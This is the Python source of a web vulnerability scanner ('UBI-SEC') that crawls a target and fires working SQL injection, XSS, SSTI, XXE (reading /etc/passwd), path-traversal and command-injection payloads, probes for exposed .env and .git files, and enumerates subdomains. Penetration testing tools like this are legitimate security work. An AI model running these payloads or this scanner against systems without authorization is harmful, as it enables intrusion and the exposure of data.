#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
  UBI-SEC Web Vulnerability Scanner
  Author: ubi-sec
================================================================================
An educational, all-in-one web recon + vulnerability scanner.

Modules:
  - Subdomain Enumeration (DNS brute-force + optional crt.sh lookup)
  - SQL Injection (error-based, URL params + forms)
  - Reflected / Form-based XSS
  - CSRF (missing token detection)
  - SSTI (Server-Side Template Injection)
  - XXE indicator test
  - Open Redirect
  - Local File Inclusion / Path Traversal
  - Command Injection (time-based)
  - CORS Misconfiguration
  - Clickjacking / Missing Security Headers
  - Insecure Cookie Flags
  - Sensitive File / Directory Exposure (.git, .env, backups, etc.)
  - IDOR indicators (manual-review flags)

⚠️  LEGAL NOTICE ⚠️
Only run this against systems you OWN or have EXPLICIT WRITTEN AUTHORIZATION
to test. Unauthorized scanning is illegal in most jurisdictions. Use on your
own lab apps (DVWA, bWAPP, Juice Shop) or authorized CTF/pentest targets only.

Usage:
    python3 ubisec_scanner.py -u https://target.com
    python3 ubisec_scanner.py -u https://target.com --deep --subdomains
    python3 ubisec_scanner.py -u https://target.com -o report.json
================================================================================
"""

import argparse
import concurrent.futures
import json
import re
import socket
import sys
import time
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    print("[!] Missing dependencies. Install with:")
    print("    pip install requests beautifulsoup4 colorama")
    sys.exit(1)

try:
    from colorama import init as colorama_init, Fore, Style
    colorama_init(autoreset=True)
    COLOR = True
except ImportError:
    COLOR = False

    class _NoColor:
        def __getattr__(self, _):
            return ""
    Fore = Style = _NoColor()

requests.packages.urllib3.disable_warnings()

AUTHOR = "ubi-sec"
VERSION = "2.0"

# ============================================================================
# BANNER / UI HELPERS
# ============================================================================

BANNER = f"""{Fore.CYAN}
██╗   ██╗██████╗ ██╗    ███████╗███████╗ ██████╗
██║   ██║██╔══██╗██║    ██╔════╝██╔════╝██╔════╝
██║   ██║██████╔╝██║    ███████╗█████╗  ██║     
██║   ██║██╔══██╗██║    ╚════██║██╔══╝  ██║     
╚██████╔╝██████╔╝██║    ███████║███████╗╚██████╗
 ╚═════╝ ╚═════╝ ╚═╝    ╚══════╝╚══════╝ ╚═════╝

{Fore.WHITE}        UBI-SEC WEB VULNERABILITY SCANNER
{Fore.YELLOW}              Author: {AUTHOR}  |  v{VERSION}
{Style.RESET_ALL}"""

SEV_COLOR = {
    "HIGH": Fore.RED,
    "MEDIUM": Fore.YELLOW,
    "LOW": Fore.BLUE,
    "INFO": Fore.CYAN,
}
SEV_ICON = {"HIGH": "🔴", "MEDIUM": "🟠", "LOW": "🟡", "INFO": "🔵"}


def hr(char="─", n=70):
    print(Fore.CYAN + char * n + Style.RESET_ALL)


def section(title):
    print()
    hr()
    print(f"{Fore.WHITE}{Style.BRIGHT}  {title}")
    hr()


# ============================================================================
# PAYLOADS / WORDLISTS
# ============================================================================

SQLI_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "' OR 1=1--", "1' AND '1'='1",
    "' UNION SELECT NULL--", "' OR SLEEP(3)--",
]

SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax", "warning: mysql",
    "unclosed quotation mark", "quoted string not properly terminated",
    "sqlstate", "sqlite3.operationalerror", "postgresql.*error",
    "ora-[0-9]{5}", "microsoft odbc", "syntax error at or near",
    "unterminated quoted string", "mysql_fetch", "pg_query",
    "sqlexception", "sql command not properly ended",
]

XSS_MARKER = "ubisecXSS9421"
XSS_PAYLOADS = [
    f"<script>alert('{XSS_MARKER}')</script>",
    f"\"><script>alert('{XSS_MARKER}')</script>",
    f"'><img src=x onerror=alert('{XSS_MARKER}')>",
    f"<img src=x onerror=alert('{XSS_MARKER}')>",
]

SSTI_PAYLOADS = {
    "{{7*7}}": "49", "${7*7}": "49", "#{7*7}": "49",
    "<%= 7*7 %>": "49", "@(7*7)": "49",
}

XXE_PAYLOAD = """<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>"""

LFI_PAYLOADS = [
    "../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd", "/etc/passwd",
]
LFI_SIGNATURES = ["root:x:0:0:", "root:*:0:0:"]

CMDI_PAYLOADS = ["; sleep 4", "| sleep 4", "` sleep 4 `", "$(sleep 4)"]
CMDI_DELAY_THRESHOLD = 3.5

OPEN_REDIRECT_PARAMS = ["redirect", "url", "next", "return", "returnUrl", "dest", "continue"]
OPEN_REDIRECT_TARGET = "https://ubi-sec-redirect-test.example.com"

SENSITIVE_PATHS = [
    ".git/config", ".git/HEAD", ".env", ".env.local", "config.php.bak",
    "backup.zip", "backup.sql", "database.sql", "wp-config.php.bak",
    ".DS_Store", "web.config", "phpinfo.php", ".htaccess",
    "admin/", "server-status", "actuator/env", "debug/default/view",
]

SECURITY_HEADERS = {
    "Content-Security-Policy": "Missing CSP — allows broader XSS impact",
    "X-Frame-Options": "Missing — vulnerable to Clickjacking",
    "X-Content-Type-Options": "Missing — MIME sniffing attacks possible",
    "Strict-Transport-Security": "Missing HSTS — downgrade/MITM risk over HTTP",
    "Referrer-Policy": "Missing — may leak URLs via Referer header",
}

COMMON_SUBDOMAINS = [
    "www", "mail", "ftp", "webmail", "smtp", "pop", "ns1", "ns2", "cpanel",
    "admin", "api", "dev", "staging", "test", "portal", "vpn", "remote",
    "blog", "shop", "store", "app", "mobile", "beta", "demo", "secure",
    "cdn", "static", "media", "img", "images", "docs", "support", "help",
    "status", "monitor", "dashboard", "panel", "internal", "intranet",
    "git", "gitlab", "jenkins", "jira", "confluence", "grafana", "kibana",
    "db", "database", "sql", "backup", "old", "new", "m", "web", "wiki",
]

TIMEOUT = 8
HEADERS = {"User-Agent": f"Mozilla/5.0 (UBI-SEC-Scanner/{VERSION})"}


# ============================================================================
# SUBDOMAIN FINDER
# ============================================================================

class SubdomainFinder:
    def __init__(self, domain, threads=20):
        self.domain = domain
        self.threads = threads
        self.found = []

    def resolve(self, sub):
        fqdn = f"{sub}.{self.domain}"
        try:
            socket.setdefaulttimeout(2)
            ip = socket.gethostbyname(fqdn)
            return (fqdn, ip)
        except (socket.gaierror, socket.timeout):
            return None

    def brute_force(self):
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {pool.submit(self.resolve, s): s for s in COMMON_SUBDOMAINS}
            for fut in concurrent.futures.as_completed(futures):
                r = fut.result()
                if r:
                    results.append(r)
                    print(f"  {Fore.GREEN}[+] Found:{Style.RESET_ALL} {r[0]}  →  {r[1]}")
        return results

    def crt_sh_lookup(self):
        """Query certificate transparency logs for known subdomains."""
        found = set()
        try:
            resp = requests.get(
                f"https://crt.sh/?q=%25.{self.domain}&output=json",
                timeout=10, headers=HEADERS,
            )
            if resp.status_code == 200:
                data = resp.json()
                for entry in data:
                    name = entry.get("name_value", "")
                    for line in name.split("\n"):
                        line = line.strip().lower()
                        if line.endswith(self.domain) and "*" not in line:
                            found.add(line)
        except Exception:
            pass
        return sorted(found)

    def run(self, use_crtsh=True):
        section(f"SUBDOMAIN ENUMERATION — {self.domain}")
        print(f"{Fore.WHITE}[*] Brute-forcing {len(COMMON_SUBDOMAINS)} common subdomains...\n")
        dns_results = self.brute_force()

        crt_results = []
        if use_crtsh:
            print(f"\n{Fore.WHITE}[*] Querying crt.sh (certificate transparency logs)...")
            crt_results = self.crt_sh_lookup()
            new_ones = [c for c in crt_results if c not in [d[0] for d in dns_results]]
            if new_ones:
                print(f"  {Fore.GREEN}[+] {len(new_ones)} additional subdomain(s) from crt.sh:")
                for c in new_ones[:30]:
                    print(f"      {c}")
                if len(new_ones) > 30:
                    print(f"      ... and {len(new_ones) - 30} more")

        all_subs = sorted(set([d[0] for d in dns_results] + crt_results))
        print(f"\n{Fore.CYAN}[*] Total unique subdomains found: {len(all_subs)}")
        return all_subs


# ============================================================================
# MAIN SCANNER
# ============================================================================

class VulnScanner:
    def __init__(self, base_url, deep=False, delay=0.3):
        self.base_url = base_url.rstrip("/")
        self.deep = deep
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.findings = []
        self.visited = set()

    def add_finding(self, vuln_type, severity, url, detail, evidence=""):
        self.findings.append({
            "type": vuln_type, "severity": severity, "url": url,
            "detail": detail, "evidence": evidence[:300],
        })
        icon = SEV_ICON.get(severity, "⚪")
        color = SEV_COLOR.get(severity, "")
        print(f"  {icon} {color}[{severity}]{Style.RESET_ALL} {Fore.WHITE}{vuln_type}{Style.RESET_ALL}: {detail}")

    def safe_get(self, url, params=None, allow_redirects=True):
        try:
            return self.session.get(url, params=params, timeout=TIMEOUT,
                                      verify=False, allow_redirects=allow_redirects)
        except requests.RequestException:
            return None

    def safe_post(self, url, data=None):
        try:
            return self.session.post(url, data=data, timeout=TIMEOUT, verify=False)
        except requests.RequestException:
            return None

    # ---------- crawling ----------

    def get_forms(self, url, html):
        soup = BeautifulSoup(html, "html.parser")
        forms = []
        for form in soup.find_all("form"):
            action = form.get("action") or url
            method = (form.get("method") or "get").lower()
            inputs = [{"name": i.get("name"), "type": i.get("type", "text")}
                      for i in form.find_all(["input", "textarea", "select"]) if i.get("name")]
            forms.append({"action": urljoin(url, action), "method": method, "inputs": inputs})
        return forms

    def get_links(self, url, html):
        soup = BeautifulSoup(html, "html.parser")
        links = set()
        for a in soup.find_all("a", href=True):
            full = urljoin(url, a["href"])
            if urlparse(full).netloc == urlparse(self.base_url).netloc:
                links.add(full.split("#")[0])
        return links

    def crawl(self, max_pages=15):
        section(f"CRAWLING — {self.base_url}")
        to_visit = {self.base_url}
        pages = []
        while to_visit and len(self.visited) < max_pages:
            url = to_visit.pop()
            if url in self.visited:
                continue
            self.visited.add(url)
            resp = self.safe_get(url)
            if resp is None or "text/html" not in resp.headers.get("Content-Type", ""):
                continue
            pages.append((url, resp))
            if self.deep:
                to_visit.update(self.get_links(url, resp.text) - self.visited)
            time.sleep(self.delay)
        print(f"{Fore.CYAN}[*] Crawled {len(pages)} page(s).")
        return pages

    # ---------- vuln tests ----------

    def test_security_headers(self, url, resp):
        for header, msg in SECURITY_HEADERS.items():
            if header not in resp.headers:
                self.add_finding("Security Headers", "LOW", url, msg)

    def test_cookies(self, url, resp):
        for cookie in self.session.cookies:
            issues = []
            if not cookie.secure:
                issues.append("missing Secure flag")
            if not cookie.has_nonstandard_attr("HttpOnly") and "httponly" not in str(cookie).lower():
                issues.append("missing HttpOnly flag")
            if issues:
                self.add_finding("Insecure Cookie", "MEDIUM", url,
                                  f"Cookie '{cookie.name}': {', '.join(issues)}")

    def test_cors(self, url, resp):
        acao = resp.headers.get("Access-Control-Allow-Origin")
        acac = resp.headers.get("Access-Control-Allow-Credentials")
        if acao == "*" and acac and acac.lower() == "true":
            self.add_finding("CORS Misconfiguration", "HIGH", url,
                              "Access-Control-Allow-Origin: * combined with credentials=true")
        elif acao == "*":
            self.add_finding("CORS Misconfiguration", "LOW", url,
                              "Access-Control-Allow-Origin is wildcard (*)")

    def test_sensitive_files(self):
        section("SENSITIVE FILE / DIRECTORY EXPOSURE")
        for path in SENSITIVE_PATHS:
            url = urljoin(self.base_url + "/", path)
            r = self.safe_get(url)
            if r and r.status_code == 200 and len(r.content) > 0:
                self.add_finding("Sensitive File Exposure", "HIGH", url,
                                  f"Publicly accessible: {path} (HTTP 200)")
            time.sleep(self.delay)

    def test_sqli(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            for payload in SQLI_PAYLOADS:
                tp = {k: v[0] for k, v in params.items()}
                tp[param] = payload
                test_url = urlunparse(parsed._replace(query=urlencode(tp)))
                r = self.safe_get(test_url)
                if r is None:
                    continue
                body = r.text.lower()
                for sig in SQL_ERROR_SIGNATURES:
                    if re.search(sig, body):
                        self.add_finding("SQL Injection", "HIGH", url,
                                          f"Param '{param}' triggered SQL error ({payload})", sig)
                        return
                time.sleep(self.delay)

    def test_sqli_forms(self, forms):
        for form in forms:
            for payload in SQLI_PAYLOADS[:4]:
                data = {i["name"]: payload for i in form["inputs"] if i["type"] != "submit"}
                if not data:
                    continue
                r = (self.safe_post(form["action"], data) if form["method"] == "post"
                     else self.safe_get(form["action"], data))
                if r is None:
                    continue
                body = r.text.lower()
                for sig in SQL_ERROR_SIGNATURES:
                    if re.search(sig, body):
                        self.add_finding("SQL Injection (Form)", "HIGH", form["action"],
                                          f"Vulnerable via payload: {payload}", sig)
                        return

    def test_xss(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            for payload in XSS_PAYLOADS:
                tp = {k: v[0] for k, v in params.items()}
                tp[param] = payload
                test_url = urlunparse(parsed._replace(query=urlencode(tp)))
                r = self.safe_get(test_url)
                if r is None:
                    continue
                if payload in r.text or XSS_MARKER in r.text:
                    self.add_finding("Reflected XSS", "HIGH", url,
                                      f"Param '{param}' reflects unescaped input")
                    return
                time.sleep(self.delay)

    def test_xss_forms(self, forms):
        for form in forms:
            data = {i["name"]: XSS_PAYLOADS[0] for i in form["inputs"]
                     if i["type"] not in ("submit", "hidden")}
            if not data:
                continue
            r = (self.safe_post(form["action"], data) if form["method"] == "post"
                 else self.safe_get(form["action"], data))
            if r and XSS_MARKER in r.text:
                self.add_finding("XSS (Form)", "HIGH", form["action"], "Form input reflected unsanitized")

    def test_ssti(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            for payload, expected in SSTI_PAYLOADS.items():
                tp = {k: v[0] for k, v in params.items()}
                tp[param] = payload
                test_url = urlunparse(parsed._replace(query=urlencode(tp)))
                r = self.safe_get(test_url)
                if r is None:
                    continue
                if expected in r.text and payload not in r.text:
                    self.add_finding("SSTI", "HIGH", url,
                                      f"Param '{param}' evaluated {payload} -> {expected}")
                    return
                time.sleep(self.delay)

    def test_lfi(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            for payload in LFI_PAYLOADS:
                tp = {k: v[0] for k, v in params.items()}
                tp[param] = payload
                test_url = urlunparse(parsed._replace(query=urlencode(tp)))
                r = self.safe_get(test_url)
                if r is None:
                    continue
                for sig in LFI_SIGNATURES:
                    if sig in r.text:
                        self.add_finding("LFI / Path Traversal", "HIGH", url,
                                          f"Param '{param}' exposed file contents ({payload})")
                        return
                time.sleep(self.delay)

    def test_cmdi(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            for payload in CMDI_PAYLOADS:
                tp = {k: v[0] for k, v in params.items()}
                tp[param] = tp.get(param, "") + payload
                test_url = urlunparse(parsed._replace(query=urlencode(tp)))
                start = time.time()
                r = self.safe_get(test_url)
                elapsed = time.time() - start
                if r and elapsed >= CMDI_DELAY_THRESHOLD:
                    self.add_finding("Command Injection (time-based)", "HIGH", url,
                                      f"Param '{param}' delayed response by {elapsed:.1f}s ({payload})")
                    return
                time.sleep(self.delay)

    def test_open_redirect(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            if param.lower() in [p.lower() for p in OPEN_REDIRECT_PARAMS]:
                tp = {k: v[0] for k, v in params.items()}
                tp[param] = OPEN_REDIRECT_TARGET
                test_url = urlunparse(parsed._replace(query=urlencode(tp)))
                r = self.safe_get(test_url, allow_redirects=False)
                if r and r.status_code in (301, 302, 303, 307, 308):
                    location = r.headers.get("Location", "")
                    if OPEN_REDIRECT_TARGET in location:
                        self.add_finding("Open Redirect", "MEDIUM", url,
                                          f"Param '{param}' redirects to attacker-controlled URL")

    def test_xxe(self, forms):
        for form in forms:
            if form["method"] != "post":
                continue
            r = self.safe_post(form["action"], data=XXE_PAYLOAD)
            if r and ("root:" in r.text or "/bin/bash" in r.text):
                self.add_finding("XXE", "HIGH", form["action"], "XML entity expansion returned file content")

    def test_idor_indicators(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param, values in params.items():
            if values and values[0].isdigit():
                self.add_finding("IDOR (manual review)", "INFO", url,
                                  f"Param '{param}={values[0]}' is numeric — try adjacent values")
        for pid in re.findall(r"/(\d{2,})(?:/|$)", parsed.path):
            self.add_finding("IDOR (manual review)", "INFO", url,
                              f"Path segment '{pid}' looks like a numeric object ID")

    def test_csrf(self, forms):
        hints = ["csrf", "token", "_token", "authenticity_token", "nonce"]
        for form in forms:
            if form["method"] != "post":
                continue
            has_token = any(any(h in i["name"].lower() for h in hints) for i in form["inputs"])
            if not has_token:
                self.add_finding("CSRF", "MEDIUM", form["action"], "POST form has no visible CSRF token field")

    # ---------- orchestration ----------

    def run(self, run_subdomains=False):
        print(BANNER)
        print(f"{Fore.WHITE}[*] Target      : {self.base_url}")
        print(f"[*] Deep crawl  : {self.deep}")
        print(f"[*] Subdomains  : {run_subdomains}")

        if run_subdomains:
            domain = urlparse(self.base_url).netloc.split(":")[0]
            # Skip if this already looks like a subdomain / IP
            if domain.count(".") <= 1 and not re.match(r"^\d+\.\d+\.\d+\.\d+$", domain):
                SubdomainFinder(domain).run()
            else:
                root = ".".join(domain.split(".")[-2:])
                SubdomainFinder(root).run()

        pages = self.crawl()
        if not pages:
            print(f"{Fore.RED}[!] Could not reach target or no HTML pages found.")
            return self.findings

        self.test_sensitive_files()

        for url, resp in pages:
            section(f"TESTING — {url}")
            self.test_security_headers(url, resp)
            self.test_cookies(url, resp)
            self.test_cors(url, resp)

            forms = self.get_forms(url, resp.text)
            if forms:
                print(f"  {Fore.CYAN}[+] Found {len(forms)} form(s)")
                self.test_csrf(forms)
                self.test_sqli_forms(forms)
                self.test_xss_forms(forms)
                self.test_xxe(forms)

            if "?" in url:
                self.test_sqli(url)
                self.test_xss(url)
                self.test_ssti(url)
                self.test_lfi(url)
                self.test_cmdi(url)
                self.test_open_redirect(url)
                self.test_idor_indicators(url)

        return self.findings

    def report(self, output_file=None):
        section("SCAN SUMMARY")
        if not self.findings:
            print(f"  {Fore.GREEN}✅ No vulnerabilities detected (with current payload set).")
            print("  Note: absence of findings does NOT guarantee the app is secure.")
        else:
            by_type = {}
            for f in self.findings:
                by_type.setdefault(f["type"], []).append(f)
            for vtype, items in by_type.items():
                sev = items[0]["severity"]
                color = SEV_COLOR.get(sev, "")
                print(f"\n  {color}{vtype} — {len(items)} finding(s){Style.RESET_ALL}")
                for item in items:
                    print(f"    [{item['severity']}] {item['url']}")
                    print(f"        -> {item['detail']}")

        hr()
        print(f"  {Fore.WHITE}{Style.BRIGHT}Total findings: {len(self.findings)}")
        hr()
        print(f"\n  {Fore.YELLOW}Scan completed by UBI-SEC Scanner — Author: {AUTHOR}")

        if output_file:
            with open(output_file, "w") as f:
                json.dump({
                    "target": self.base_url, "author": AUTHOR,
                    "pages_scanned": len(self.visited), "findings": self.findings,
                }, f, indent=2)
            print(f"\n{Fore.CYAN}[*] JSON report saved to: {output_file}")


# ============================================================================
# CLI
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description=f"UBI-SEC Web Vulnerability Scanner v{VERSION} — by {AUTHOR}",
        epilog="⚠️  Only use on authorized targets. See docstring for legal notice.",
    )
    parser.add_argument("-u", "--url", required=True, help="Target base URL")
    parser.add_argument("--deep", action="store_true", help="Crawl linked pages too")
    parser.add_argument("--subdomains", action="store_true", help="Enumerate subdomains before scanning")
    parser.add_argument("-o", "--output", help="Save JSON report to file")
    parser.add_argument("--delay", type=float, default=0.3, help="Delay between requests (default 0.3s)")
    args = parser.parse_args()

    if not args.url.startswith(("http://", "https://")):
        args.url = "http://" + args.url

    print(f"\n{Fore.RED}⚠️  LEGAL NOTICE: Only scan targets you own or are authorized to test.{Style.RESET_ALL}\n")

    scanner = VulnScanner(args.url, deep=args.deep, delay=args.delay)
    scanner.run(run_subdomains=args.subdomains)
    scanner.report(output_file=args.output)


if __name__ == "__main__":
    main()
